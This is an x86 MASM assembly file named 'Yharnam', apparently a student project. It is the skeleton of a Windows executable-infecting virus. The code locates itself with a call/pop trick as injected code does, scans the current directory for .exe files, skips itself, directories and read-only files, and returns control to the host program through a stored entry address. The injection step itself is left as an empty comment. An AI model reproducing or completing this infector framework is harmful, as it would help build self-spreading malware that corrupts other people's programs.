; Yharnam
;
; Made by:
;
; 	- alexandre.paillier@epitech.eu
;
	
.386
.model flat, stdcall
option casemap:none

      include \masm32\include\windows.inc
      include \masm32\include\kernel32.inc

      includelib \masm32\lib\kernel32.lib

.data

.code

data:
	fileFilter  		BYTE ".\*.exe",0
	returnAddr			DWORD 000000000h
	stackSize			DWORD ((sizeof BYTE * MAX_PATH * 2) + \
							  sizeof WIN32_FIND_DATA + \
							  sizeof HANDLE)
; offsets to the stack pointer
	currentExe			DWORD 0
	targetName			DWORD (sizeof BYTE * MAX_PATH)
	fileStruct	 		DWORD (sizeof BYTE * MAX_PATH * 2)
	fileSearchHandle	DWORD (sizeof BYTE * MAX_PATH * 2 + sizeof WIN32_FIND_DATA)

start:
	call _getAddr_ ; get the injected .exe's environment instruction pointer
_getAddr_:
	pop ebx
	; ebx holds "data section" address
	; (call instruction + (start label address - data label instruction))
	sub ebx, (5 + (start - data))

	sub esp, [ebx + (stackSize - data)]

	mov edx, esp
	push MAX_PATH
	add edx, [ebx + (currentExe - data)]
	push edx
	push NULL
	call GetModuleFileName ; get current .exe full file path

	mov edx, esp
	add edx, [ebx + (fileStruct - data)]
	push edx
	mov edx, ebx
	add edx, (fileFilter - data)
	push edx
	call FindFirstFile

	cmp eax, INVALID_HANDLE_VALUE
	je loop_find_file_end

	mov edx, esp
	add edx, [ebx + (fileSearchHandle - data)]
	mov [edx], eax
loop_find_file:
	; check file and put it on the stack if needed
	mov eax, esp ; save stack "base" address
	push NULL
	mov edx, eax
	add edx, [ebx + (targetName - data)]
	push edx
	push MAX_PATH
	mov edx, eax
	add edx, [ebx + (fileStruct - data)]
	add edx, (fileStruct.WIN32_FIND_DATA.cFileName - fileStruct.WIN32_FIND_DATA)
	push edx
	call GetFullPathName ; get absolute file path
	
	mov edx, esp ; check if it's a directory
	add edx, [ebx + (fileStruct - data)]
	mov edx, [edx + (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)]
	and edx, FILE_ATTRIBUTE_DIRECTORY
	cmp edx, FILE_ATTRIBUTE_DIRECTORY
	je loop_find_file_skip

	mov eax, esp
	mov edx, eax
	add edx, [ebx + (targetName - data)]
	push edx
	mov edx, eax
	add edx, [ebx + (currentExe - data)]
	push edx
	call lstrcmp ; check if this is the program
	cmp eax, 0
	je loop_find_file_skip

	mov edx, esp ; check if it's a read-only file
	add edx, [ebx + (fileStruct - data)]
	mov edx, [edx + (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)]
	and edx, FILE_ATTRIBUTE_READONLY
	cmp edx, FILE_ATTRIBUTE_READONLY
	je loop_find_file_skip

;	injection
;

loop_find_file_skip:
	mov eax, esp
	mov edx, eax
	add edx, [ebx + (fileStruct - data)]
	push edx
	mov edx, eax
	add edx, [ebx + (fileSearchHandle - data)]
	push [edx]
	call FindNextFile
	cmp eax, TRUE
	je loop_find_file
loop_find_file_end:

	mov eax, [ebx + (returnAddr - data)]
	cmp eax, 0
	jne return_to_exec
	invoke ExitProcess, 0
return_to_exec:
	jmp eax

end start